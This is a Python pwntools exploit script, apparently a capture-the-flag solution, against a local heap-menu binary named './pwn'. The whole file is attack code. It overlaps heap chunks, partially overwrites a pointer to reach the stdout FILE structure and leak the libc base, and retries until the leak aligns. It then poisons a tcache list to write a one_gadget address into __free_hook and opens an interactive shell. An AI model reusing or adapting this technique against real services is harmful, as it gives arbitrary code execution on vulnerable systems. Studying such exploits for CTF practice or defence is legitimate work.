from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Your choice: '
def add(size, data):
	sla(menu, b'1')
	sla(b'Size:', byte(size))
	sda(b'Data:', data)

def dele(idx):
	sla(menu, b'2')
	sla(b'Index:', byte(idx))

flag = True
while flag:
	try:
		#flag = False
		io = process("./pwn")
		add(0x410, b'0') # 0
		add(0x20, b'1')  # 1
		add(0x10, b'2')  # 2
		add(0x30, b'3')  # 3
		add(0x4f0, b'4') # 4
		add(0x10, b'5')  # 5
		dele(0)
		dele(3)
		pay = b'A'*0x30 + p64(0x4B0)
		add(0x38, pay)   # 0
		dele(4)
		dele(1)
		add(0x410, b'0') # 1
		add(0x40, b'\x60\xe7') # 3
		#debug()
		add(0x20, b'0') # 4
		pay = p64(0xfbad1800) + p64(0)*3
		add(0x20, pay)  # 6
		rc(8)
		libc.address = addr(6) - 0x3ed8b0
		if libc.address&0xFFF:
			io.close()
			continue
		realloc = libc.sym.realloc
		free_hook = libc.sym.__free_hook
		malloc_hook = libc.sym.__malloc_hook
		info("libc_base", libc.address)
		info("realloc", realloc)
		info("free_hook", free_hook)
		info("malloc_hook", malloc_hook)
		ones = [0x4f2c5, 0x4f322, 0x10a38c]
		ones = [i+libc.address for i in ones]
		add(0x30, b'7') # 7
		dele(0)
		dele(7)
		add(0x30, p64(free_hook))
		add(0x30, b'7')
		add(0x30, p64(ones[1]))
		dele(7)
		#debug()
		sh()
		break
	except Exception as e:
		io.close()
		continue
